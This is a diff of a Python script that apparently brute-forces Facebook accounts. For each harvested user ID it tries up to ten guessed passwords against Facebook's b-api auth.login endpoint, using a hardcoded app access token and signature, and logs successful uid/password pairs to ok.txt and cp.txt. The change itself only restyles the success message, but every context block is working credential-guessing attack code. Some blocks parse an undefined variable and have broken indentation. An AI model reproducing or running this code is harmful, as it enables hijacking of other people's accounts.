@@ -334,7 +334,7 @@ def b_menu_select():
 		    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		    d=json.loads(q)
 		    if "access_token" in d:
-		        print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass1+" | "+name)
+		        print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass1+"\x1b[1;92m | \x1b[1;92m"+name)
 		        cp=open("cp.txt","a")
 		        cp.write(uid+" | "+pass1+"\n")
 		        cp.close()
@@ -346,7 +346,7 @@ def b_menu_select():
 		            data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		            d=json.loads(q)
 		            if 'access_token' in d:
-		                print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass2+" | "+name)
+		                print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass2+"\x1b[1;92m | \x1b[1;92m"+name)
 		                ok=open("ok.txt","a")
 		                ok.write(uid+" | "+pass2+"\n")
 		                ok.close()
@@ -358,7 +358,7 @@ def b_menu_select():
 				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                d=json.loads(q)
 		                if 'access_token' in d:
-		                    print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass3+" | "+name)
+		                    print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass3+"\x1b[1;92m | \x1b[1;92m"+name)
 		                    ok=open("ok.txt","a")
 		                    ok.write(uid+" | "+pass3+"\n")
 		                    ok.close()
@@ -370,7 +370,7 @@ def b_menu_select():
 		                    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                    d=json.loads(q)
 		                    if 'access_token' in d:
-		                        print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass4+" | "+name)
+		                        print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass4+"\x1b[1;92m | \x1b[1;92m"+name)
 		                        ok=open("ok.txt","a")
 		                        ok.write(uid+" | "+pass4+"\n")
 		                        ok.close()
@@ -382,7 +382,7 @@ def b_menu_select():
 					data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                        d=json.loads(q)
 		                        if 'access_token' in d:
-		                            print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass5+" | "+name)
+		                            print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass5+"\x1b[1;92m | \x1b[1;92m"+name)
 		                            ok=open("ok.txt","a")
 		                            ok.write(uid+" | "+pass5+"\n")
 		                            ok.close()
@@ -394,7 +394,7 @@ def b_menu_select():
 					    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                            d=json.loads(q)
 		                            if 'access_token' in d:
-		                                print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass6+" | "+name)
+		                                print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass6+"\x1b[1;92m | \x1b[1;92m"+name)
 		                                ok=open("ok.txt","a")
 		                                ok.write(uid+" | "+pass6+"\n")
 		                                ok.close()
@@ -406,7 +406,7 @@ def b_menu_select():
 						data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                                d=json.loads(q)
 		                                if 'access_token' in d:
-		                                    print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass7+" | "+name)
+		                                    print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass7+"\x1b[1;92m | \x1b[1;92m"+name)
 		                                    ok=open("ok.txt","a")
 		                                    ok.write(uid+" | "+pass7+"\n")
 		                                    ok.close()
@@ -418,7 +418,7 @@ def b_menu_select():
 		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass8 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                    d=json.loads(q)
 		                                    if 'access_token' in d:
-		                                        print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass8+" | "+name)
+		                                        print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass8+"\x1b[1;92m | \x1b[1;92m"+name)
 		                                        ok=open("ok.txt","a")
 		                                        ok.write(uid+" | "+pass8+"\n")
 		                                        ok.close()
@@ -430,7 +430,7 @@ def b_menu_select():
 							q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass9 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                        d=json.loads(q)
 		                                        if 'access_token' in d:
-		                                            print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass9+" | "+name)
+		                                            print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass9+"\x1b[1;92m | \x1b[1;92m"+name)
 		                                            ok=open("ok.txt","a")
 		                                            ok.write(uid+" | "+pass9+"\n")
 		                                            ok.close()
@@ -442,7 +442,7 @@ def b_menu_select():
 		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass10 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 		                                            d=json.loads(q)
 		                                            if 'access_token' in d:
-		                                                print("\t\x1b[1;92m[Successfull] "+uid+" | "+pass10+" | "+name)
+		                                                print("\x1b[1;92m[\x1b[1;97mOk\x1b[1;92m]\x1b[1;92m "+uid+"\x1b[1;92m | \x1b[1;92m"+pass10+"\x1b[1;92m | \x1b[1;92m"+name)
 		                                                ok=open("ok.txt","a")
 		                                                ok.write(uid+" | "+pass10+"\n")
 		                                                ok.close()
